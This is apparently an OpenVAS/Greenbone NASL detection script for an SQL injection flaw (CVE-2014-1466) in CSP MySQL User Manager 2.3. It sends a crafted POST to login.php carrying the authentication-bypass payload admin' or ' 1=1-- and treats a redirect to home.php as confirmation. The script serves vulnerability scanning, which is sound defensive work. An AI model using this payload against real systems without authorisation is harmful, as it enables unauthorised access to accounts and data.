# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804229");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2014-1466");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2014-01-28 11:34:43 +0530 (Tue, 28 Jan 2014)");
  script_name("CSP MySQL User Manager 2.3 SQLi Vulnerability");

  script_tag(name:"summary", value:"CSP MySQL User Manager is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to input passed via the 'username' parameter to 'login.php',
  which is not properly sanitised before being used in a SQL query.");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL queries by
  injecting arbitrary SQL code and gain sensitive information.");

  script_tag(name:"affected", value:"CSP MySQL User Manager 2.3. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by
  another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124724/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64731");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/90210");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("host_details.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

foreach dir (make_list_unique("/cmum", "/cspmum", "/", http_cgi_dirs(port:port))) {

  if(dir == "/")
    dir = "";

  res = http_get_cache(item:dir + "/index.php", port:port);

  if(res && ">:: CSP MySQL User Manager<" >< res) {
    url = dir + "/login.php";
    payload = "loginuser=admin%27+or+%27+1%3D1--&loginpass=" + rand_str(length:5);

    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Referer: http://", host, dir, "/index.php \r\n",
                 "Connection: keep-alive\r\n",
                 "Cookie: PHPSESSID=fb8c63eb59035022c9f853dba0785c4f\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(payload), "\r\n\r\n",
                 payload);
    res = http_keepalive_send_recv(port:port, data:req);

    if(res && res =~ "^HTTP/1\.[01] 302" && "Location: home.php" >< res) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
